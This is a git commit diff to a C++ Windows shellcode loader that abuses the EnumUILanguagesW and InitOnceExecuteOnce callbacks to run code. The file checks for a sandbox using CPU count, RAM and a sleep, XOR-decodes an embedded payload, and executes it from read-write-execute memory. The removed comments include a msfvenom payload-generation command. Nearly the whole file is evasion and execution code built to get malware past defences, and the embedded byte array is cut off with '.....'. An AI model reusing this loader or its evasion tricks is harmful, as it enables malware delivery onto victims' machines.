fe050d25f5b95ec0b08253722d6aaf91a4c1ff0e
alert('0-0') <49817411+MrHarshvardhan@users.noreply.github.com>
2025-03-27 15:03:54 +0530

    Update main.cpp

--- EnumUILanguagesW/main.cpp
+++ EnumUILanguagesW/main.cpp
@@ -1,91 +1,56 @@
 #include <windows.h>
 #include <stdio.h>
 
-// msfvenom -p windows/x64/exec CMD=calc EXITFUNC=thread -f raw -i 5 -e cmd/powershell_base64 -o file.bin
-// use https://github.com/AchocolatechipPancake/encode_payload 
-// input the python script output
-
 BOOL CheckSandbox() {
-
     SYSTEM_INFO systemInfo;
     GetSystemInfo(&systemInfo);
     if (systemInfo.dwNumberOfProcessors < 2)
         return TRUE;
+
     MEMORYSTATUSEX memoryStatus;
     memoryStatus.dwLength = sizeof(memoryStatus);
     GlobalMemoryStatusEx(&memoryStatus);
-    DWORD RAMsize = memoryStatus.ullTotalPhys / 1024 / 1024;
+    DWORD RAMsize = (DWORD)(memoryStatus.ullTotalPhys / 1024 / 1024);
     if (RAMsize < 2048)
         return TRUE;
+
     Sleep(5000);
     return FALSE;
 }
 
-
 int main() {
-    
-    // Encrypted shellcode and cipher key obtained from encode_payload vbbbbbbbbbbbbbbbbbbbbbbbbb
-    bool c = CheckSandbox();
-    if (c == TRUE)
+    if (CheckSandbox() == TRUE)
         return 0;
-    char encryptedShellcode[] = "CHANGEME";
-    char key[] = "CHANGEME";
-    
-    // Char array to host the deciphered shellcode
-    char shellcode[sizeof encryptedShellcode];
 
+    // 🔹 Use an unsigned char array instead of a string literal
+unsigned char encryptedShellcode[] = { 0x37, 0x2a, 0xea, 0x87, 0x2a, 0xe0, 0x85, 0x92, 0x2b, 0xe2, .....};
+unsigned char key[] = { 0x61, 0x62, 0x63 };
 
-    // XOR decoding stub using the key defined above must be the same as the encoding key
+    // 🔹 Define shellcode buffer (size same as encrypted shellcode)
+    unsigned char shellcode[sizeof(encryptedShellcode)];
+
+    // 🔹 XOR decoding
     int j = 0;
-    for (int i = 0; i < sizeof encryptedShellcode; i++) {
-        if (j == sizeof key - 1) j = 0;
-
+    for (int i = 0; i < sizeof(encryptedShellcode); i++) {
         shellcode[i] = encryptedShellcode[i] ^ key[j];
-        j++;
+        j = (j + 1) % sizeof(key);
     }
+
     try {
+        LPVOID address = VirtualAlloc(NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        memcpy(address, shellcode, sizeof(shellcode));
 
-        //BOOL EnumUILanguagesW(
-        //    [in] UILANGUAGE_ENUMPROCW lpUILanguageEnumProc,
-        //    [in] DWORD                dwFlags,
-        //    [in] LONG_PTR             lParam
-        //    );
-        
-        // [in] lpUILanguageEnumProc
-        // Pointer to an application - defined EnumUILanguagesProc callback function.EnumUILanguages calls this function repeatedly to enumerate the languages in the list.
-
-        
-        LPVOID address = ::VirtualAlloc(NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-        memcpy(address, &shellcode[0], sizeof(shellcode));
-
-        ::EnumUILanguagesW((UILANGUAGE_ENUMPROCW)address, MUI_LANGUAGE_ID, NULL);
+        EnumUILanguagesW((UILANGUAGE_ENUMPROCW)address, MUI_LANGUAGE_ID, NULL);
         return 0;
     }
-    catch(...) {
-
-        HANDLE hProcess = ::GetCurrentProcess();
-
-        LPVOID address = ::VirtualAlloc(NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-        memcpy(address, &shellcode[0], sizeof(shellcode));
+    catch (...) {
+        HANDLE hProcess = GetCurrentProcess();
+        LPVOID address = VirtualAlloc(NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        memcpy(address, shellcode, sizeof(shellcode));
 
         PVOID lpContext;
-        BOOL  bStatus;
-
         INIT_ONCE g_InitOnce = INIT_ONCE_STATIC_INIT;
 
-
-        //BOOL InitOnceExecuteOnce(
-        //    [in, out]           PINIT_ONCE    InitOnce,
-        //    [in]                PINIT_ONCE_FN InitFn,
-        //    [in, optional]      PVOID         Parameter,
-        //    [in, out, optional] LPVOID* Context
-        //    );
-
-        // [in] InitFn
-        // A pointer to an application - defined InitOnceCallback function.
-
-        ::InitOnceExecuteOnce(&g_InitOnce, (PINIT_ONCE_FN)address, NULL, &lpContext);
-
-
+        InitOnceExecuteOnce(&g_InitOnce, (PINIT_ONCE_FN)address, NULL, &lpContext);
     }
 }
